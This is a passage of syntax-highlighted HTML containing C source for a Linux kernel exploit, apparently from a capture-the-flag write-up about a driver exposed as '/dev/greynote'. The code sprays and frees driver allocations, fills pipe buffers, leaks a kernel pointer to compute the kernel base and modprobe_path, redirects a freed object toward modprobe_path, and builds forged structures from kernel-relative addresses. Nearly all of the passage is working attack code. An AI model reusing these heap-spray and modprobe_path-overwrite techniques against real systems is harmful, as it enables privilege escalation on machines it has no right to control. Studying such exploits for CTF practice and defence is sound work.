+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">init_pipe</span>(<span style="color:#66d9ef">int</span> pipefds[<span style="color:#ae81ff">2</span>]) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">pipe</span>(pipefds) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;pipe&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">print_arr</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>arr, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> n, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> size) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">unsigned</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> n; <span style="color:#f92672">++</span>i) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">switch</span>(size) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;0x%x: 0x%hhx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, i, <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint8_t</span> <span style="color:#f92672">*</span>)(arr <span style="color:#f92672">+</span> i));
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;0x%x: 0x%hx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, i<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>, <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint16_t</span> <span style="color:#f92672">*</span>)(arr <span style="color:#f92672">+</span> i<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>));
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">4</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;0x%x: 0x%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, i<span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>, <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint32_t</span> <span style="color:#f92672">*</span>)(arr <span style="color:#f92672">+</span> i<span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>));
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">8</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;0x%x: 0x%lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>, <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(arr <span style="color:#f92672">+</span> i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>));
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pin_cpu</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;/dev/greynote&#34;</span>, O_RDWR);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">size_t</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x200</span>; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">alloc</span>(fd, i) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;error_alloc</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">size_t</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x200</span>; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">delete</span>(fd, i) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;error_delete</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> pipefds[<span style="color:#ae81ff">0x100</span>][<span style="color:#ae81ff">2</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buf1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#ae81ff">0x10000</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(buf1, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x10000</span>);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">size_t</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x100</span>; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">init_pipe</span>(pipefds[i]);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">write</span>(pipefds[i][<span style="color:#ae81ff">1</span>], buf1, <span style="color:#ae81ff">0x10000</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> kleak <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">size_t</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x200</span>; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>buf <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">print</span>(fd, i, <span style="color:#ae81ff">0x400</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; j <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x400</span><span style="color:#f92672">/</span><span style="color:#ae81ff">0x8</span>; j<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(buf[j] <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0xffffffff00000000</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">print_arr</span>(<span style="color:#f92672">&amp;</span>buf[j], <span style="color:#ae81ff">0x40</span><span style="color:#f92672">/</span><span style="color:#ae81ff">0x8</span>, <span style="color:#ae81ff">0x8</span>);
+</span></span><span style="display:flex;"><span>                kleak <span style="color:#f92672">=</span> buf[j];
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">goto</span> out1;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>out1:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> kbase <span style="color:#f92672">=</span> kleak <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1426740</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> modprobe_path <span style="color:#f92672">=</span> kbase <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1d4aec0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;base: 0x%lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, kbase);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;modprobe_path: 0x%lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, modprobe_path);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">size_t</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x200</span>; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">alloc</span>(fd, i<span style="color:#f92672">+</span><span style="color:#ae81ff">0x200</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;error_alloc</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">size_t</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x200</span>; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">delete</span>(fd, i<span style="color:#f92672">+</span><span style="color:#ae81ff">0x200</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;error_delete</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">size_t</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x200</span>; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>buf <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">print</span>(fd, i<span style="color:#f92672">+</span><span style="color:#ae81ff">0x200</span>, <span style="color:#ae81ff">0x400</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; j <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x400</span><span style="color:#f92672">/</span><span style="color:#ae81ff">0x8</span>; j<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span>(buf[j] <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">print_arr</span>(<span style="color:#f92672">&amp;</span>buf[j], <span style="color:#ae81ff">0x40</span><span style="color:#f92672">/</span><span style="color:#ae81ff">0x8</span>, <span style="color:#ae81ff">0x8</span>);
+</span></span><span style="display:flex;"><span>                buf[j] <span style="color:#f92672">=</span> modprobe_path <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x2c0</span>;    
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">edit</span>(fd, i<span style="color:#f92672">+</span><span style="color:#ae81ff">0x200</span>, (<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>)buf, <span style="color:#ae81ff">0x400</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;error_edit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">goto</span> out2;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>out2:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">size_t</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x200</span>; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">alloc</span>(fd, i<span style="color:#f92672">+</span><span style="color:#ae81ff">0x400</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;error_alloc</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>buf <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">print</span>(fd, i, <span style="color:#ae81ff">0x400</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> x <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1d4aba0</span><span style="color:#f92672">+</span>kbase;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1d4aca0</span><span style="color:#f92672">+</span>kbase;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1ea28e0</span><span style="color:#f92672">+</span>kbase;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1ebd940</span><span style="color:#f92672">+</span>kbase;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1c56880</span><span style="color:#f92672">+</span>kbase;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1d73020</span><span style="color:#f92672">+</span>kbase;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xaf</span>;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1d4ab40</span><span style="color:#f92672">+</span>kbase;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1d4a7c0</span><span style="color:#f92672">+</span>kbase;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x8</span>;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1d4ac20</span><span style="color:#f92672">+</span>kbase;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1d4ad20</span><span style="color:#f92672">+</span>kbase;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1ea28e0</span><span style="color:#f92672">+</span>kbase;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1ebd9a0</span><span style="color:#f92672">+</span>kbase;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1c3b000</span><span style="color:#f92672">+</span>kbase;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1d606a0</span><span style="color:#f92672">+</span>kbase;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xb0</span>;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1d4ab40</span><span style="color:#f92672">+</span>kbase;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1d4a7c0</span><span style="color:#f92672">+</span>kbase;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x8</span>;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1d4aca0</span><span style="color:#f92672">+</span>kbase;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1d4ada0</span><span style="color:#f92672">+</span>kbase;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1ea2940</span><span style="color:#f92672">+</span>kbase;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1ebda00</span><span style="color:#f92672">+</span>kbase;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1c3b080</span><span style="color:#f92672">+</span>kbase;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1d60720</span><span style="color:#f92672">+</span>kbase;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xb1</span>;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1d4ab60</span><span style="color:#f92672">+</span>kbase;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1d4a810</span><span style="color:#f92672">+</span>kbase;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x8</span>;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1d4ad20</span><span style="color:#f92672">+</span>kbase;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1d4c4e0</span><span style="color:#f92672">+</span>kbase;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1ea29a0</span><span style="color:#f92672">+</span>kbase;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1ebda60</span><span style="color:#f92672">+</span>kbase;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1c3b100</span><span style="color:#f92672">+</span>kbase;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1d607a0</span><span style="color:#f92672">+</span>kbase;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xb2</span>;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1d4ab80</span><span style="color:#f92672">+</span>kbase;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1d4a840</span><span style="color:#f92672">+</span>kbase;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x8</span>;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x34faa0</span><span style="color:#f92672">+</span>kbase;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1aeedd9</span><span style="color:#f92672">+</span>kbase;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x34fa40</span><span style="color:#f92672">+</span>kbase;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1aeede1</span><span style="color:#f92672">+</span>kbase;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x34f9c0</span><span style="color:#f92672">+</span>kbase;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1aeede9</span><span style="color:#f92672">+</span>kbase;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x34f970</span><span style="color:#f92672">+</span>kbase;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1aeedf9</span><span style="color:#f92672">+</span>kbase;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x34f900</span><span style="color:#f92672">+</span>kbase;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1aeee01</span><span style="color:#f92672">+</span>kbase;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
+</span></span><span style="display:flex;"><span>        buf[x<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
